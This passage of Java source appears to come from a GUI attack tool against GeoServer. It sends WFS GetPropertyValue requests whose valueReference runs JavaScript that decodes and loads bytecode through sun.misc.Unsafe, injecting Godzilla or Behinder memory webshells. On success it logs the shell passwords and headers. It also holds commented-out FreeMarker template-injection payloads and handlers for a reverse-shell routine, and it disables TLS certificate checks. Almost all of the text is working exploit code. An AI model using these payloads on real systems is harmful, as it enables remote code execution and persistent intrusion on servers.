            //   Matcher m = r.matcher(errorResponse.toString());
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);


                }

                if (errorResponse.toString().contains("java.lang.ClassCastException")) {

                    testghjg.appendText("\n" + formattedDateTime + url + "反弹已执行" + "\n");

                } else {

                    testghjg.appendText("\n" + formattedDateTime + url + "反弹失败" + "\n");
                }


            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            testghjg.appendText("\n" + formattedDateTime + url + "反弹异常-" + "\n");

        }


    }


    public void rcedf(javafx.event.ActionEvent actionEvent) {

        zhuaqu();
        geoserverfdfg();
    }

    public void fantanshekk(javafx.event.ActionEvent actionEvent) {

        fantanshell();
        fsdsaddff();
    }

    public void fantanshekkdfds(javafx.event.ActionEvent actionEvent) {

        String selectedItem = myComboBox.getValue();


        if ("all".equals(selectedItem)) {

            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("拼写检查");
            alert.setHeaderText("");
            alert.setContentText("请选择模块！");
            alert.showAndWait();
        } else if ("Godzilla".equals(selectedItem)) {

            fantanshell();
            jdfdsfdsf();





        } else if ("Behinder".equals(selectedItem)) {

         //   fantanshell();
          //  jfdddsdsgdghhgj();
        }
    }

    public void jdfdsfdsf(){

        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {

                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
        //    String originalText = tesft.getText();
          //  String encryptedText = Base64.getEncoder().encodeToString(originalText.getBytes());
            URL url1 = new URL(url + "/geoserver/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            String json="<wfs:GetPropertyValue service='WFS' version='2.0.0'\n" +
                    " xmlns:topp='http://www.openplans.org/topp'\n" +
                    " xmlns:fes='http://www.opengis.net/fes/2.0'\n" +
                    " xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n" +
                    "  <wfs:Query typeNames='"+terefesf.getText()+"'/>\n" +
                    "  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'\n" +
                    "var str=\"\";\n" +
                    "var bt;\n" +
                    "try {\n" +
                    "    bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
                    "} catch (e) {\n" +
                    "    bt = java.util.Base64.getDecoder().decode(str);\n" +
                    "}\n" +
                    "var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
                    "theUnsafe.setAccessible(true);\n" +
                    "unsafe = theUnsafe.get(null);\n" +
                    "unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), bt, null).newInstance();\n" +
                    "')</wfs:valueReference>\n" +
                    "</wfs:GetPropertyValue>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            //  connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setRequestMethod("POST");
      
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.getBytes());
            outputStream.flush();
            outputStream.close();


            //  String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(errorResponse.toString());
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);


                }

                if (errorResponse.toString().contains("java.lang.ClassCastException")) {

                    testghjg.appendText("\n" + formattedDateTime + url  +"/geoserver/wfs/"+"哥斯拉注入成功" + "\n");
                    testghjg.appendText("加密器: JAVA_AES_BASE64"+"密码pass"+"密钥: Rjdjglsetx"+"请求路径: /*"+"请求头: Referer: Lftst"+"\n");

                } else {

                    testghjg.appendText("\n" + formattedDateTime + url + "哥斯拉注入失败" + "\n");
                }


            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            testghjg.appendText("\n" + formattedDateTime + url + "哥斯拉注入失败-" + "\n");

        }
    }

    public void jfdddsdsgdghhgj(){

        String url = testgfgd.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {


            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {

                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            //    String originalText = tesft.getText();
            //  String encryptedText = Base64.getEncoder().encodeToString(originalText.getBytes());
            URL url1 = new URL(url + "/geoserver/wfs");
            //     String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
            //    String json = "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}";
           String json="<wfs:GetPropertyValue service='WFS' version='2.0.0'\n" +
                   " xmlns:topp='http://www.openplans.org/topp'\n" +
                   " xmlns:fes='http://www.opengis.net/fes/2.0'\n" +
                   " xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n" +
                   "  <wfs:Query typeNames='"+terefesf.getText()+"'/>\n" +
                   "  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'\n" +
                   "var str=\"\";\n" +
                   "var bt;\n" +
                   "try {\n" +
                   "    bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
                   "} catch (e) {\n" +
                   "    bt = java.util.Base64.getDecoder().decode(str);\n" +
                   "}\n" +
                   "var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
                   "theUnsafe.setAccessible(true);\n" +
                   "unsafe = theUnsafe.get(null);\n" +
                   "unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), bt, null).newInstance();\n" +
                   "')</wfs:valueReference>\n" +
                   "</wfs:GetPropertyValue>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            //  connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setRequestMethod("POST");
       
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Content-Type", "application/xml");
            connection.setRequestProperty("User-Agent", "curl/7.77.0");
            connection.setDoOutput(true);
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(json.getBytes());
            outputStream.flush();
            outputStream.close();


            //  String pattern = "<wfs:ReturnFeatureType>(.*?)</wfs:ReturnFeatureType>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(errorResponse.toString());
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_BAD_REQUEST) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);


                }

                if (errorResponse.toString().contains("java.lang.ClassCastException")) {

                    testghjg.appendText("\n" + formattedDateTime + url  +"冰蝎注入成功" + "\n");
                    testghjg.appendText("密码pass"+"请求路径: /*"+"请求头: Referer: Tbzemr"+"\n");

                } else {

                    testghjg.appendText("\n" + formattedDateTime + url + "冰蝎注入失败" + "\n");
                }


            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            testghjg.appendText("\n" + formattedDateTime + url + "冰蝎注入失败-" + "\n");

        }


    }

}










